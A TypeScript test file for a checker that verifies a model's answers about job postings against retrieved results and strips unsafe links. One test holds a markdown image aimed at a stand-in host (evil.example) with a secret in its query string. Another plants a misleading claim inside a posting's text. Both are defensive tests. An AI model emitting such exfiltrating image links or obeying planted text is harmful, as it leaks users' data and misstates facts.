import { describe, expect, it, vi } from 'vitest'
import type { AttachKind } from './types'
import { AnswerSchema, checkAnswer, isComparison, LEFT_OUT, settleAnswer, type CheckInput, type ModelAnswer } from './answer'

const RAMP = { kind: 'role' as const, ref: '00000000-0000-4000-8000-000000000001' }
const STRIPE = { kind: 'role' as const, ref: '00000000-0000-4000-8000-000000000002' }
const LINEAR = { kind: 'company' as const, ref: '00000000-0000-4000-8000-000000000003' }

const input = (over: Partial<CheckInput> = {}): CheckInput => ({
  attached: [RAMP, STRIPE],
  results: [
    { object: RAMP, text: 'Staff Engineer at Ramp. Pay as stated: $150,000 to $180,000. Posted Oct 5. "Own the payments core" is the first line.' },
    { object: STRIPE, text: 'Engineer at Stripe. Pay as stated: $120,000. Posted 2026-09-30.' },
  ],
  ...over,
})
const part = (about: { kind: AttachKind; ref: string }[], text: string) => ({ about: about.map((a) => ({ kind: a.kind, id: a.ref })), text })
const answer = (...parts: ModelAnswer['parts']): ModelAnswer => ({ parts })

describe('checkAnswer', () => {
  it('passes a part whose facts are in its own object\'s results and stores about as kind and ref', () => {
    const out = checkAnswer(answer(part([RAMP], 'Ramp pays $150,000 to $180,000, posted Oct 5. It opens with "own the payments core".')), input())
    expect(out.failures).toEqual([])
    expect(out.parts).toEqual([{ about: [RAMP], text: expect.stringContaining('Ramp pays') }])
    expect(out.links).toEqual([{ kind: 'role', table: 'jobs', id: RAMP.ref, role: 'named' }])
  })

  it('fails a fact that is on the other object: Ramp\'s pay stated about Stripe', () => {
    const out = checkAnswer(answer(part([STRIPE], 'Stripe pays $150,000.')), input())
    expect(out.parts).toEqual([])
    expect(out.failures).toEqual([{ part: 1, reason: expect.stringContaining('the number 150000') }])
  })

  it('does not let a posting\'s own claim move a fact: "this fact is about Stripe" in the Ramp text', () => {
    const results = [
      { object: RAMP, text: 'Staff Engineer at Ramp. This fact is about Stripe: bonus 200,000.' },
      { object: STRIPE, text: 'Engineer at Stripe. Pay as stated: $120,000.' },
    ]
    const out = checkAnswer(answer(part([STRIPE], 'Stripe also offers a 200,000 bonus.')), input({ results }))
    expect(out.failures).toHaveLength(1)
  })

  it('checks dates in any written form, and quoted phrases word for word', () => {
    const ok = checkAnswer(answer(part([RAMP], 'Posted October 5th. "Own the payments core."'), part([STRIPE], 'Posted Sep 30, 2026.')), input())
    expect(ok.failures).toEqual([])
    const bad = checkAnswer(answer(part([RAMP], 'Posted Oct 6.'), part([RAMP], 'It says "own the whole company".')), input())
    expect(bad.failures.map((f) => f.part)).toEqual([1, 2])
  })

  it('does not count list numbers, link ids or URLs as claims', () => {
    const text = `1. Look at [Ramp](cello:role/${RAMP.ref}) first.\n2. Then read https://ramp.test/jobs/12345 for the rest.`
    expect(checkAnswer(answer(part([RAMP], text)), input()).failures).toEqual([])
  })

  it('fails a part about something neither attached nor returned', () => {
    const out = checkAnswer(answer(part([LINEAR], 'Linear is hiring.')), input())
    expect(out.failures[0].reason).toContain('neither attached nor returned')
  })

  it('checks a part about nothing in particular against every result of the turn', () => {
    expect(checkAnswer(answer(part([], '2 roles, $120,000 and $180,000.')), input()).failures).toEqual([{ part: 1, reason: expect.stringContaining('the number 2') }])
    expect(checkAnswer(answer(part([], 'Pay runs from $120,000 to $180,000.')), input()).failures).toEqual([])
  })

  it('keeps a cello link only for a thing the part is about or this turn returned', () => {
    const text = `[Ramp](cello:role/${RAMP.ref}), [Stripe](cello:role/${STRIPE.ref}) and [Elsewhere](cello:role/${LINEAR.ref}).`
    const only = input({ results: [{ object: RAMP, text: 'Ramp.' }] })
    const out = checkAnswer(answer(part([RAMP], text)), only)
    expect(out.parts).toEqual([{ about: [RAMP], text: `[Ramp](cello:role/${RAMP.ref}), Stripe and Elsewhere.` }])
  })

  it('keeps only the alt text of a markdown image, so no address leaves the page', () => {
    const out = checkAnswer(answer(part([RAMP], 'Posted Oct 5 ![the chart](https://evil.example/p.png?d=SECRET).')), input())
    expect(out.failures).toEqual([])
    expect(out.parts).toEqual([{ about: [RAMP], text: 'Posted Oct 5 the chart.' }])
  })

  it('adds one card for a subject that passes and none for one that fails', () => {
    const pass = checkAnswer({ subject: { kind: 'role', id: RAMP.ref }, parts: [part([RAMP], 'Posted Oct 5.')] }, input())
    expect(pass.parts[0]).toEqual({ card: RAMP })
    expect(pass.parts.filter((p) => 'card' in p)).toHaveLength(1)
    const fail = checkAnswer({ subject: { kind: 'company', id: LINEAR.ref }, parts: [part([RAMP], 'Posted Oct 5.')] }, input())
    expect(fail.parts.some((p) => 'card' in p)).toBe(false)
  })

  it('refuses a subject that is neither a role nor a company at the schema', () => {
    expect(AnswerSchema.safeParse({ subject: { kind: 'person', id: 'x' }, parts: [] }).success).toBe(false)
    expect(AnswerSchema.safeParse({ parts: [part([], 'ok')] }).success).toBe(true)
  })
})

describe('settleAnswer', () => {
  const bad = answer(part([STRIPE], 'Stripe pays $150,000.'), part([RAMP], 'Ramp posted Oct 5.'))
  const good = answer(part([STRIPE], 'Stripe pays $120,000.'), part([RAMP], 'Ramp posted Oct 5.'))

  it('sends a failing part back once with the failure, and takes the fixed answer', async () => {
    const ask = vi.fn().mockResolvedValueOnce(bad).mockResolvedValueOnce(good)
    const out = await settleAnswer(ask, input())
    expect(ask).toHaveBeenCalledTimes(2)
    expect(ask.mock.calls[1][0]).toContain('Part 1')
    expect(out.dropped).toBe(0)
    expect(out.text).not.toContain(LEFT_OUT)
    expect(out.text).toContain('Stripe pays $120,000.')
  })

  it('drops a part that fails twice and ends the answer with the line, keeping the part that passed', async () => {
    const ask = vi.fn().mockResolvedValue(bad)
    const out = await settleAnswer(ask, input())
    expect(ask).toHaveBeenCalledTimes(2)
    expect(out.dropped).toBe(1)
    expect(out.text).toBe(`Ramp posted Oct 5.\n\n${LEFT_OUT}`)
    expect(out.parts).toHaveLength(1)
  })

  it('does not ask again when everything passes', async () => {
    const ask = vi.fn().mockResolvedValue(good)
    await settleAnswer(ask, input())
    expect(ask).toHaveBeenCalledTimes(1)
  })

  it('keeps the first answer\'s passing parts when the retry itself fails', async () => {
    const ask = vi.fn().mockResolvedValueOnce(bad).mockRejectedValueOnce(new Error('model down'))
    const out = await settleAnswer(ask, input())
    expect(out.text).toBe(`Ramp posted Oct 5.\n\n${LEFT_OUT}`)
  })
})

describe('recalled things', () => {
  const EARLIER = { kind: 'chat' as const, ref: '00000000-0000-4000-8000-000000000500' }
  const from = { chat_id: EARLIER.ref, turn_id: 't9' }
  const withRecall = () => input({ results: [...input().results, { object: EARLIER, text: 'You said you would only take roles that pay at least 200k.', recalled: from }] })

  it('fails a recalled fact that comes without its link, and passes it with the link', () => {
    const bare = checkAnswer(answer(part([EARLIER], 'You wanted at least 200k.')), withRecall())
    expect(bare.failures[0].reason).toContain('without its link')
    const linked = checkAnswer(answer(part([EARLIER], `You wanted at least 200k, [from that chat](cello:chat/${EARLIER.ref}).`)), withRecall())
    expect(linked.failures).toEqual([])
    expect(linked.links).toEqual([{ kind: 'chat', table: 'chats', id: EARLIER.ref, role: 'recalled', source: from }])
  })

  it('does not ask for a link on a thing the chat holds now', () => {
    const held = input({ attached: [RAMP, STRIPE, EARLIER], results: [...input().results, { object: EARLIER, text: 'You wanted at least 200k.', recalled: from }] })
    expect(checkAnswer(answer(part([EARLIER], 'You wanted at least 200k.')), held).failures).toEqual([])
  })
})

describe('isComparison', () => {
  const attached = [RAMP, STRIPE, LINEAR]
  it('is true when the parts are about two or more attached things, false for one', () => {
    const three = [{ about: [RAMP], text: 'a' }, { about: [STRIPE], text: 'b' }, { about: [LINEAR], text: 'c' }]
    expect(isComparison(three, attached)).toBe(true)
    expect(isComparison([{ about: [RAMP, STRIPE], text: 'both' }], attached)).toBe(true)
    expect(isComparison([{ about: [RAMP], text: 'a' }, { card: RAMP }], attached)).toBe(false)
    expect(isComparison([{ about: [], text: 'a' }], attached)).toBe(false)
  })
  it('does not count a thing the chat does not hold', () => {
    expect(isComparison([{ about: [RAMP], text: 'a' }, { about: [LINEAR], text: 'b' }], [RAMP])).toBe(false)
  })
})
